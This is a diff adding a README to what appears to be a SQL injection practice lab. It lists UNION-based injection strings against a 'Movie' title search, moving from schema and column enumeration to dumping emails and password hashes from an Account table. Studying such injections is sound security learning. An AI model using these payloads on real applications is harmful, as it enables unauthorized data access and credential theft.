@@ -1,3 +1,28 @@
 # SQL INJECTION
 
-Initial commit, More to be added later
+```sql 
+-- Init
+SHOW DATABASES;
+USE sqli;
+SHOW TABLES;
+
+SELECT * FROM Movie;
+
+SELECT * FROM Movie WHERE Title LIKE "%sh%";
+--sh
+
+SELECT * FROM Movie WHERE Title LIKE "%";-- %";
+--";-- 
+
+SELECT * FROM Movie WHERE Title LIKE "%" UNION ();-- %";
+--" UNION ();-- 
+
+SELECT * FROM Movie WHERE Title LIKE "%" UNION (SELECT 0, TABLE_SCHEMA, TABLE_NAME, 0, 0, 0, 0, 0 FROM INFORMATION_SCHEMA.TABLES);-- %";
+--" UNION (SELECT 0, TABLE_SCHEMA, TABLE_NAME, 0, 0, 0, 0, 0 FROM INFORMATION_SCHEMA.TABLES);-- 
+
+SELECT * FROM Movie WHERE Title LIKE "%" UNION (SELECT 0, TABLE_NAME, COLUMN_NAME, 0, 0, 0, 0, 0 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'account');-- %";
+--" UNION (SELECT 0, TABLE_NAME, COLUMN_NAME, 0, 0, 0, 0, 0 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'account');--  
+
+SELECT * FROM Movie WHERE Title LIKE "%" UNION (SELECT Id, Email, PasswordHash, Type, 0, 0, 0, 0 FROM sqli.Account);-- %";
+--" UNION (SELECT Id, Email, PasswordHash, Type, 0, 0, 0, 0 FROM sqli.Account);--  
+```
